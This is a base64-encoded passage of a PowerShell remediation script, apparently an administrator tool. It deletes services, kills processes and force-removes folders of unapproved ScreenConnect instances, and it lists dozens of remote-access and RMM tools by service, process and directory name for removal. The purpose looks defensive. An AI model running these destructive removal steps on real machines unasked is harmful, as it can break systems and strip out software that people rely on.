CiAgICAgICAgJiBzYy5leGUgZGVsZXRlICIkKCRzdmMuTmFtZSkiIDI+JjEgfCBPdXQtTnVsbAog
ICAgICAgICRuLnN2YysrOyBMb2cgInN2Y19kZWxldGVkICQoJHN2Yy5OYW1lKSIKICAgIH0KCiAg
ICAjIDMuIGZvcmVpZ24gU0MgcHJvY2Vzc2VzIChraWxsIGV2ZW4gd2hlbiBFeGVjdXRhYmxlUGF0
aCBpcyBudWxsKQogICAgR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3MgLUZpbHRlciAiTmFt
ZSBsaWtlICdTY3JlZW5Db25uZWN0JSciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwg
Rm9yRWFjaC1PYmplY3QgewogICAgICAgICRleGUgPSAkXy5FeGVjdXRhYmxlUGF0aAogICAgICAg
ICRjbWQgPSAkXy5Db21tYW5kTGluZQogICAgICAgICRrZWVwZXIgPSAoSXMtS2VlcGVyICRleGUp
IC1vciAoSXMtS2VlcGVyICRjbWQpCiAgICAgICAgaWYgKC1ub3QgJGtlZXBlcikgewogICAgICAg
ICAgICBTdG9wLVByb2Nlc3MgLUlkICRfLlByb2Nlc3NJZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNp
bGVudGx5Q29udGludWUKICAgICAgICAgICAgJG4ucHJvYysrOyBMb2cgInByb2Nfa2lsbGVkIHBp
ZD0kKCRfLlByb2Nlc3NJZCkgZXhlPSRleGUiCiAgICAgICAgfQogICAgfQoKICAgICMgNC4gZm9y
ZWlnbiBTQyBpbnN0YWxsIGRpcnMgKFBGICsgUEY4NikKICAgIGZvcmVhY2ggKCRiYXNlIGluIEAo
JGVudjpQcm9ncmFtRmlsZXMsICR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSkpIHsKICAgICAgICBp
ZiAoLW5vdCAkYmFzZSAtb3IgLW5vdCAoVGVzdC1QYXRoICRiYXNlKSkgeyBjb250aW51ZSB9CiAg
ICAgICAgR2V0LUNoaWxkSXRlbSAtTGl0ZXJhbFBhdGggJGJhc2UgLURpcmVjdG9yeSAtRm9yY2Ug
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3Qg
eyAkXy5OYW1lIC1saWtlICdTY3JlZW5Db25uZWN0KicgfSB8IEZvckVhY2gtT2JqZWN0IHsKICAg
ICAgICAgICAgICAgICRkID0gJF8uRnVsbE5hbWUKICAgICAgICAgICAgICAgIGlmIChJcy1LZWVw
ZXIgJGQpIHsgcmV0dXJuIH0KICAgICAgICAgICAgICAgIGlmIChGb3JjZS1SZW1vdmVEaXIgJGQp
IHsgJG4uZGlyKys7IExvZyAiZGlyX3JlbW92ZWQgJGQiIH0KICAgICAgICAgICAgICAgIGVsc2Ug
eyAkbi5mYWlsKys7IExvZyAiZGlyX1JFTU9WRV9GQUlMRUQgJGQiIH0KICAgICAgICAgICAgfQog
ICAgfQoKICAgICMgNS4gZGlzYWxsb3dlZCBSTU0gLyByZW1vdGUtYWNjZXNzIHRvb2xzIChtYXJr
ZXQgY292ZXJhZ2UgMjAyNikuCiAgICAjIEtFRVAgZm9yZXZlcjogRGF0dG8vQ2VudHJhU3RhZ2Ug
KyBTY3JlZW5Db25uZWN0IGtlZXAgRlBzIChoYW5kbGVkIGFib3ZlKS4KICAgICMgTkVWRVIgcHV0
IERhdHRvL0NlbnRyYVN0YWdlL0NhZ1NlcnZpY2UgaW4gdGhpcyBsaXN0LgogICAgZnVuY3Rpb24g
SXMtRGF0dG9LZWVwZXIoW3N0cmluZ10kcykgewogICAgICAgIGlmICgtbm90ICRzKSB7IHJldHVy
biAkZmFsc2UgfQogICAgICAgIHJldHVybiBbYm9vbF0oJHMgLW1hdGNoICcoP2kpRGF0dG98Q2Vu
dHJhU3RhZ2V8Q2FnU2VydmljZXxBdXRvdGFza0VuZHBvaW50JykKICAgIH0KICAgICRybW0gPSBA
KAogICAgICAgIEB7IFRhZz0nQW55RGVzayc7ICAgICAgU3ZjPUAoJ0FueURlc2snKTsgUHJvYz1A
KCdBbnlEZXNrJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQW55RGVzayIsIiR7ZW52OlBy
b2dyYW1GaWxlcyh4ODYpfVxBbnlEZXNrIiwiJGVudjpQcm9ncmFtRGF0YVxBbnlEZXNrIik7IFBy
b2Q9QCgnQW55RGVzayonKSB9CiAgICAgICAgQHsgVGFnPSdUZWFtVmlld2VyJzsgICBTdmM9QCgn
VGVhbVZpZXdlcionKTsgUHJvYz1AKCdUZWFtVmlld2VyKicsJ3R2X3czMionLCd0dl94NjQqJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcVGVhbVZpZXdlciIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxUZWFtVmlld2VyIik7IFByb2Q9QCgnVGVhbVZpZXdlcionKSB9CiAgICAgICAgQHsg
VGFnPSdTcGxhc2h0b3AnOyAgICBTdmM9QCgnU3BsYXNodG9wKicsJ1NSU2VydmljZScsJ1NTVVNl
cnZpY2UnKTsgUHJvYz1AKCdTcGxhc2h0b3AqJywnc3Ryd2luY2x0KicsJ1NSTWFuYWdlcionKTsg
RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTcGxhc2h0b3AiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cU3BsYXNodG9wIik7IFByb2Q9QCgnU3BsYXNodG9wKicpIH0KICAgICAgICBAeyBUYWc9
J0xvZ01lSW4nOyAgICAgIFN2Yz1AKCdMb2dNZUluJywnTE1JR3VhcmRpYW5TdmMnLCdMTUlpZ25p
dGlvbicpOyBQcm9jPUAoJ0xvZ01lSW4qJywnTE1JR3VhcmRpYW4qJywnUmFTZXJ2ZXIqJyk7IERp
cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTG9nTWVJbiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
fVxMb2dNZUluIik7IFByb2Q9QCgnTG9nTWVJbionKSB9CiAgICAgICAgQHsgVGFnPSdHb1RvJzsg
ICAgICAgICBTdmM9QCgnR29Ub015UEMqJywnR29Ub0Fzc2lzdConLCdHb1RvUmVzb2x2ZSonKTsg
UHJvYz1AKCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0KicsJ2cybSonLCdHb1RvUmVzb2x2ZSonKTsg
RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xHb1RvTXlQQyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
ODYpfVxHb1RvTXlQQyIpOyBQcm9kPUAoJ0dvVG9NeVBDKicsJ0dvVG9Bc3Npc3QqJywnR29UbyBS
ZXNvbHZlKicsJ0dvVG9NZWV0aW5nKicsJ0dvVG8gQ29ubmVjdConKSB9CiAgICAgICAgQHsgVGFn
PSdSdXN0RGVzayc7ICAgICBTdmM9QCgnUnVzdERlc2snLCdydXN0ZGVzayonKTsgUHJvYz1AKCdy
dXN0ZGVzayonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSdXN0RGVzayIsIiR7ZW52OlBy
b2dyYW1GaWxlcyh4ODYpfVxSdXN0RGVzayIpOyBQcm9kPUAoJ1J1c3REZXNrKicpIH0KICAgICAg
ICBAeyBUYWc9J1N1cHJlbW8nOyAgICAgIFN2Yz1AKCdTdXByZW1vKicpOyBQcm9jPUAoJ1N1cHJl
bW8qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU3VwcmVtbyIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxTdXByZW1vIik7IFByb2Q9QCgnU3VwcmVtbyonKSB9CiAgICAgICAgQHsgVGFn
PSdEV1NlcnZpY2UnOyAgICBTdmM9QCgnRFdBZ2VudCcsJ2R3YWdlbnQqJyk7IFByb2M9QCgnZHdh
Z2VudConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xEV0FnZW50IiwiJHtlbnY6UHJvZ3Jh
bUZpbGVzKHg4Nil9XERXQWdlbnQiLCIkZW52OlByb2dyYW1EYXRhXERXQWdlbnQiKTsgUHJvZD1A
KCdEV0FnZW50KicsJ0RXU2VydmljZSonKSB9CiAgICAgICAgQHsgVGFnPSdab2hvQXNzaXN0Jzsg
ICBTdmM9QCgnWm9ob0Fzc2lzdConLCdab2hvTWVldGluZyonKTsgUHJvYz1AKCdab2hvQXNzaXN0
KicsJ1pvaG9VUlNCKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFpvaG9NZWV0aW5nIiwi
JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFpvaG9NZWV0aW5nIik7IFByb2Q9QCgnWm9obyBBc3Np
c3QqJywnWm9ob01lZXRpbmcqJykgfQogICAgICAgIEB7IFRhZz0nUmVtb3RlUEMnOyAgICAgU3Zj
PUAoJ1JlbW90ZVBDKicpOyBQcm9jPUAoJ1JlbW90ZVBDKicsJ1JQQ1N1aXRlKicpOyBEaXJzPUAo
IiRlbnY6UHJvZ3JhbUZpbGVzXFJlbW90ZVBDIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJl
bW90ZVBDIik7IFByb2Q9QCgnUmVtb3RlUEMqJykgfQogICAgICAgIEB7IFRhZz0nQm9tZ2FyJzsg
ICAgICAgU3ZjPUAoJ2JvbWdhcionLCdCZXlvbmRUcnVzdConKTsgUHJvYz1AKCdib21nYXIqJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQm9tZ2FyIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XEJvbWdhciIsIiRlbnY6UHJvZ3JhbUZpbGVzXEJleW9uZFRydXN0IiwiJHtlbnY6UHJvZ3Jh
bUZpbGVzKHg4Nil9XEJleW9uZFRydXN0Iik7IFByb2Q9QCgnQm9tZ2FyKicsJ0JleW9uZFRydXN0
KicpIH0KICAgICAgICBAeyBUYWc9J1BhcnNlYyc7ICAgICAgIFN2Yz1AKCdQYXJzZWMqJyk7IFBy
b2M9QCgncGFyc2VjZConLCdwc2VydmljZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xQ
YXJzZWMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUGFyc2VjIiwiJGVudjpQcm9ncmFtRGF0
YVxQYXJzZWMiKTsgUHJvZD1AKCdQYXJzZWMqJykgfQogICAgICAgIEB7IFRhZz0nQ2hyb21lUkQn
OyAgICAgU3ZjPUAoJ2Nocm9tb3RpbmcqJyk7IFByb2M9QCgncmVtb3RpbmdfaG9zdConKTsgRGly
cz1AKCIkZW52OlByb2dyYW1GaWxlc1xHb29nbGVcQ2hyb21lIFJlbW90ZSBEZXNrdG9wIiwiJHtl
bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEdvb2dsZVxDaHJvbWUgUmVtb3RlIERlc2t0b3AiKTsgUHJv
ZD1AKCdDaHJvbWUgUmVtb3RlIERlc2t0b3AqJykgfQogICAgICAgIEB7IFRhZz0nVWx0cmFWTkMn
OyAgICAgU3ZjPUAoJ3V2bmMqJywnd2ludm5jKicpOyBQcm9jPUAoJ3dpbnZuYyonLCd1dm5jKicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFVsdHJhVk5DIiwiJHtlbnY6UHJvZ3JhbUZpbGVz
KHg4Nil9XFVsdHJhVk5DIik7IFByb2Q9QCgnVWx0cmFWTkMqJywnV2luVk5DKicpIH0KICAgICAg
ICBAeyBUYWc9J1RpZ2h0Vk5DJzsgICAgIFN2Yz1AKCd0dm5zZXJ2ZXIqJyk7IFByb2M9QCgndHZu
c2VydmVyKicsJ3R2bnZpZXdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xUaWdodFZO
QyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxUaWdodFZOQyIpOyBQcm9kPUAoJ1RpZ2h0Vk5D
KicpIH0KICAgICAgICBAeyBUYWc9J1JlYWxWTkMnOyAgICAgIFN2Yz1AKCd2bmNzZXJ2ZXIqJyk7
IFByb2M9QCgndm5jc2VydmVyKicsJ3ZuY3ZpZXdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
aWxlc1xSZWFsVk5DIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJlYWxWTkMiKTsgUHJvZD1A
KCdWTkMgU2VydmVyKicsJ1JlYWxWTkMqJykgfQogICAgICAgIEB7IFRhZz0nRGFtZVdhcmUnOyAg
ICAgU3ZjPUAoJ0RhbWVXYXJlKicpOyBQcm9jPUAoJ0RXUkNTKicsJ0RXUkNDKicsJ0RhbWVXYXJl
KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNvbGFyV2luZHMiLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cU29sYXJXaW5kcyIsIiRlbnY6UHJvZ3JhbUZpbGVzXERhbWVXYXJlIFJlbW90
ZSBTdXBwb3J0IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XERhbWVXYXJlIFJlbW90ZSBTdXBw
b3J0Iik7IFByb2Q9QCgnRGFtZVdhcmUqJykgfQogICAgICAgIEB7IFRhZz0nTmV0U3VwcG9ydCc7
ICAgU3ZjPUAoJ05ldFN1cHBvcnQqJyk7IFByb2M9QCgnY2xpZW50MzIqJywncGNpY3RsKicpOyBE
aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5ldFN1cHBvcnQiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cTmV0U3VwcG9ydCIpOyBQcm9kPUAoJ05ldFN1cHBvcnQqJykgfQogICAgICAgIEB7IFRh
Zz0nU2ltcGxlSGVscCc7ICAgU3ZjPUAoJ1NpbXBsZUhlbHAqJyk7IFByb2M9QCgnU2ltcGxlU2Vy
dmljZSonLCdzaW1wbGVzZXJ2aWNlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNpbXBs
ZUhlbHAiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU2ltcGxlSGVscCIpOyBQcm9kPUAoJ1Np
bXBsZUhlbHAqJykgfQogICAgICAgIEB7IFRhZz0nR2V0U2NyZWVuJzsgICAgU3ZjPUAoJ0dldFNj
cmVlbionKTsgUHJvYz1AKCdHZXRTY3JlZW4qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
R2V0U2NyZWVuIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEdldFNjcmVlbiIpOyBQcm9kPUAo
J0dldFNjcmVlbionKSB9CiAgICAgICAgQHsgVGFnPSdJcGVyaXVzJzsgICAgICBTdmM9QCgnSXBl
cml1cyonKTsgUHJvYz1AKCdJcGVyaXVzUmVtb3RlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
bGVzXElwZXJpdXMgUmVtb3RlIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XElwZXJpdXMgUmVt
b3RlIik7IFByb2Q9QCgnSXBlcml1cyonKSB9CiAgICAgICAgQHsgVGFnPSdJU0xPbmxpbmUnOyAg
IFN2Yz1AKCdJU0xsaWdodConKTsgUHJvYz1AKCdJU0xsaWdodConLCdJU0xBbHdheXNPbionKTsg
RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xJU0wgT25saW5lIiwiJHtlbnY6UHJvZ3JhbUZpbGVz
KHg4Nil9XElTTCBPbmxpbmUiKTsgUHJvZD1AKCdJU0wgTGlnaHQqJywnSVNMIEFsd2F5c09uKicp
IH0KICAgICAgICBAeyBUYWc9J0FtbXl5JzsgICAgICAgIFN2Yz1AKCdBbW15eSonKTsgUHJvYz1A
KCdBbW15eSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBbW15eSIsIiR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfVxBbW15eSIpOyBQcm9kPUAoJ0FtbXl5KicpIH0KICAgICAgICBAeyBUYWc9
J1VsdHJhVmlld2VyJzsgIFN2Yz1AKCdVbHRyYVZpZXdlcionKTsgUHJvYz1AKCdVbHRyYVZpZXdl
cionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xVbHRyYVZpZXdlciIsIiR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfVxVbHRyYVZpZXdlciIpOyBQcm9kPUAoJ1VsdHJhVmlld2VyKicpIH0KICAg
ICAgICBAeyBUYWc9J0Flcm9BZG1pbic7ICAgIFN2Yz1AKCdBZXJvQWRtaW4qJyk7IFByb2M9QCgn
QWVyb0FkbWluKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFlcm9BZG1pbiIsIiR7ZW52
OlByb2dyYW1GaWxlcyh4ODYpfVxBZXJvQWRtaW4iKTsgUHJvZD1AKCdBZXJvQWRtaW4qJykgfQog
ICAgICAgIEB7IFRhZz0nTGl0ZU1hbmFnZXInOyAgU3ZjPUAoJ0xpdGVNYW5hZ2VyKicpOyBQcm9j
PUAoJ1JPTVNlcnZlcionLCdST01WaWV3ZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
TGl0ZU1hbmFnZXIiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGl0ZU1hbmFnZXIiKTsgUHJv
ZD1AKCdMaXRlTWFuYWdlcionKSB9CiAgICAgICAgQHsgVGFnPSdSYWRtaW4nOyAgICAgICBTdmM9
QCgnUmFkbWluKicpOyBQcm9jPUAoJ3JzZXJ2ZXIzKicsJ1JhZG1pbionKTsgRGlycz1AKCIkZW52
OlByb2dyYW1GaWxlc1xSYWRtaW4gU2VydmVyIDMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
UmFkbWluIFNlcnZlciAzIik7IFByb2Q9QCgnUmFkbWluKicpIH0KICAgICAgICBAeyBUYWc9J05v
TWFjaGluZSc7ICAgIFN2Yz1AKCdueHNlcnZlcionLCdueGQqJyk7IFByb2M9QCgnbnhkKicsJ254
c2VydmVyKicsJ254cnVubmVyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5vTWFjaGlu
ZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOb01hY2hpbmUiKTsgUHJvZD1AKCdOb01hY2hp
bmUqJykgfQogICAgICAgIEB7IFRhZz0nTmluamFPbmUnOyAgICAgU3ZjPUAoJ05pbmphUk1NQWdl
bnQnLCduaW5qYXJtbSonLCdOaW5qYVJNTSonKTsgUHJvYz1AKCdOaW5qYVJNTUFnZW50KicsJ25p
bmphcm1tKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5pbmphUk1NQWdlbnQiLCIke2Vu
djpQcm9ncmFtRmlsZXMoeDg2KX1cTmluamFSTU1BZ2VudCIsIiRlbnY6UHJvZ3JhbURhdGFcTmlu
amFSTU1BZ2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVzXE5pbmphT25lIiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XE5pbmphT25lIik7IFByb2Q9QCgnTmluamFSTU0qJywnTmluamFPbmUqJykgfQog
ICAgICAgIEB7IFRhZz0nQXRlcmEnOyAgICAgICAgU3ZjPUAoJ0F0ZXJhQWdlbnQnKTsgUHJvYz1A
KCdBdGVyYUFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFURVJBIE5ldHdvcmtz
IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFURVJBIE5ldHdvcmtzIiwiJGVudjpQcm9ncmFt
RGF0YVxBVEVSQSBOZXR3b3JrcyIpOyBQcm9kPUAoJ0F0ZXJhKicpIH0KICAgICAgICBAeyBUYWc9
J0Nvbm5lY3RXaXNlJzsgIFN2Yz1AKCdMVFNlcnZpY2UnLCdMVFN2Y01vbicpOyBQcm9jPUAoJ0xU
U3ZjKicsJ0xUVHJheSonKTsgRGlycz1AKCIkZW52OndpbmRpclxMVFN2YyIsIiRlbnY6UHJvZ3Jh
bUZpbGVzXExhYlRlY2ggQ2xpZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExhYlRlY2gg
Q2xpZW50Iik7IFByb2Q9QCgnQ29ubmVjdFdpc2UgQXV0b21hdGUqJywnQ29ubmVjdFdpc2UgUk1N
KicsJ0xhYlRlY2gqJykgfQogICAgICAgIEB7IFRhZz0nS2FzZXlhJzsgICAgICAgU3ZjPUAoJ0Fn
ZW50TW9uJywnS2FzZXlhKicsJ0tBQURTKicpOyBQcm9jPUAoJ0FnZW50TW9uKicsJ0thc2V5YSon
KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xLYXNleWEiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cS2FzZXlhIik7IFByb2Q9QCgnS2FzZXlhIFZTQSonLCdLYXNleWEgQWdlbnQqJykgfQog
ICAgICAgIEB7IFRhZz0nTmFibGUnOyAgICAgICAgU3ZjPUAoJ0FkdmFuY2VkIE1vbml0b3Jpbmcg
QWdlbnQqJywnTi1hYmxlKicsJ05DZW50cmFsKicpOyBQcm9jPUAoJ0ZpbGVTeXN0ZW1BZ2VudCon
LCdOQ2VudHJhbConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBZHZhbmNlZCBNb25pdG9y
aW5nIEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFkdmFuY2VkIE1vbml0b3Jpbmcg
QWdlbnQiLCIkZW52OlByb2dyYW1GaWxlc1xOLWFibGUgVGVjaG5vbG9naWVzIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XE4tYWJsZSBUZWNobm9sb2dpZXMiLCIkZW52OlByb2dyYW1GaWxlc1xN
U1BBIEZpbGVzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1TUEEgRmlsZXMiKTsgUHJvZD1A
KCdBZHZhbmNlZCBNb25pdG9yaW5nIEFnZW50KicsJ04tYWJsZSonLCdOLWNlbnRyYWwqJywnTi1z
aWdodConLCdUYWtlIENvbnRyb2wqJywnU29sYXJXaW5kcyBNU1AqJykgfQogICAgICAgIEB7IFRh
Zz0nU3luY3JvJzsgICAgICAgU3ZjPUAoJ1N5bmNybyonLCdLYWJ1dG8qJyk7IFByb2M9QCgnU3lu
Y3JvKicsJ0thYnV0byonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSZXBhaXJUZWNoIiwi
JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJlcGFpclRlY2giLCIkZW52OlByb2dyYW1GaWxlc1xT
eW5jcm8iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU3luY3JvIiwiJGVudjpQcm9ncmFtRGF0
YVxTeW5jcm8iKTsgUHJvZD1AKCdTeW5jcm8qJywnS2FidXRvKicsJ1JlcGFpclRlY2gqJykgfQog
ICAgICAgIEB7IFRhZz0nUHVsc2V3YXknOyAgICAgU3ZjPUAoJ1B1bHNld2F5KicsJ1BDIE1vbml0
b3IqJyk7IFByb2M9QCgnUENNb25pdG9yTWdyKicsJ1BDTW9uaXRvck1hbmFnZXIqJywnUHVsc2V3
YXkqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUHVsc2V3YXkiLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cUHVsc2V3YXkiLCIkZW52OlByb2dyYW1GaWxlc1xQQyBNb25pdG9yIiwiJHtl
bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFBDIE1vbml0b3IiKTsgUHJvZD1AKCdQdWxzZXdheSonLCdQ
QyBNb25pdG9yKicpIH0KICAgICAgICBAeyBUYWc9J1N1cGVyT3BzJzsgICAgIFN2Yz1AKCdTdXBl
ck9wcyonKTsgUHJvYz1AKCdTdXBlck9wcyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xT
dXBlck9wcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTdXBlck9wcyIsIiRlbnY6UHJvZ3Jh
bURhdGFcU3VwZXJPcHMiKTsgUHJvZD1AKCdTdXBlck9wcyonKSB9CiAgICAgICAgQHsgVGFnPSdM
ZXZlbCc7ICAgICAgICBTdmM9QCgnTGV2ZWwqJyk7IFByb2M9QCgnbGV2ZWwqJyk7IERpcnM9QCgi
JGVudjpQcm9ncmFtRmlsZXNcTGV2ZWwiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGV2ZWwi
LCIkZW52OlByb2dyYW1EYXRhXExldmVsIik7IFByb2Q9QCgnTGV2ZWwqJykgfQogICAgICAgIEB7
IFRhZz0nQWN0aW9uMSc7ICAgICAgU3ZjPUAoJ0FjdGlvbjEqJyk7IFByb2M9QCgnQWN0aW9uMSon
LCdhY3Rpb24xX2FnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFjdGlvbjEiLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQWN0aW9uMSIsIiRlbnY6UHJvZ3JhbURhdGFcQWN0aW9u
MSIpOyBQcm9kPUAoJ0FjdGlvbjEqJykgfQogICAgICAgIEB7IFRhZz0nTWFuYWdlRW5naW5lJzsg
U3ZjPUAoJ01hbmFnZUVuZ2luZSonLCdVRU1TKicsJ0RDQWdlbnQqJyk7IFByb2M9QCgnTWFuYWdl
RW5naW5lKicsJ2RjYWdlbnQqJywnVUVNUyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xN
YW5hZ2VFbmdpbmUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTWFuYWdlRW5naW5lIik7IFBy
b2Q9QCgnTWFuYWdlRW5naW5lKicsJ1VFTVMqJywnRGVza3RvcCBDZW50cmFsKicsJ0VuZHBvaW50
IENlbnRyYWwqJywnUk1NIENlbnRyYWwqJykgfQogICAgICAgIEB7IFRhZz0nVGFjdGljYWxSTU0n
OyAgU3ZjPUAoJ3RhY3RpY2Fscm1tKicsJ01lc2ggQWdlbnQnLCdNZXNoQWdlbnQnKTsgUHJvYz1A
KCd0YWN0aWNhbHJtbSonLCdtZXNoYWdlbnQqJywnTWVzaEFnZW50KicpOyBEaXJzPUAoIiRlbnY6
UHJvZ3JhbUZpbGVzXFRhY3RpY2FsQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cVGFj
dGljYWxBZ2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVzXE1lc2ggQWdlbnQiLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cTWVzaCBBZ2VudCIpOyBQcm9kPUAoJ1RhY3RpY2FsKicsJ01lc2ggQWdlbnQq
JywnTWVzaENlbnRyYWwqJykgfQogICAgICAgIEB7IFRhZz0nTWVzaENlbnRyYWwnOyAgU3ZjPUAo
J01lc2ggQWdlbnQnLCdNZXNoQWdlbnQnLCdNZXNoQ2VudHJhbConKTsgUHJvYz1AKCdNZXNoQWdl
bnQqJywnTWVzaENlbnRyYWwqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTWVzaCBBZ2Vu
dCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxNZXNoIEFnZW50Iik7IFByb2Q9QCgnTWVzaCpB
Z2VudConLCdNZXNoQ2VudHJhbConKSB9CiAgICAgICAgQHsgVGFnPSdDb250aW51dW0nOyAgICBT
dmM9QCgnU0FBWionLCdDb250aW51dW0qJyk7IFByb2M9QCgnU0FBWionLCdDb250aW51dW0qJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU0FBWk9EIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XFNBQVpPRCIsIiRlbnY6UHJvZ3JhbUZpbGVzXENvbnRpbnV1bSIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxDb250aW51dW0iKTsgUHJvZD1AKCdDb250aW51dW0qJywnU0FBWionKSB9CiAg
ICAgICAgQHsgVGFnPSdOYXZlcmlzayc7ICAgICBTdmM9QCgnTmF2ZXJpc2sqJyk7IFByb2M9QCgn
TmF2ZXJpc2sqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmF2ZXJpc2siLCIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cTmF2ZXJpc2siKTsgUHJvZD1AKCdOYXZlcmlzayonKSB9CiAgICAg
ICAgQHsgVGFnPSdJbW15Qm90JzsgICAgICBTdmM9QCgnSW1teUJvdConLCdJbW15KicpOyBQcm9j
PUAoJ0ltbXlBZ2VudConLCdJbW15Qm90KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXElt
bXlCb3QiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cSW1teUJvdCIsIiRlbnY6UHJvZ3JhbURh
dGFcSW1teUJvdCIpOyBQcm9kPUAoJ0ltbXlCb3QqJykgfQogICAgICAgIEB7IFRhZz0nQXV0b21v
eCc7ICAgICAgU3ZjPUAoJ2FtYWdlbnQqJywnQXV0b21veConKTsgUHJvYz1AKCdhbWFnZW50Kicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEF1dG9tb3giLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cQXV0b21veCIsIiRlbnY6UHJvZ3JhbURhdGFcYW1hZ2VudCIpOyBQcm9kPUAoJ0F1dG9t
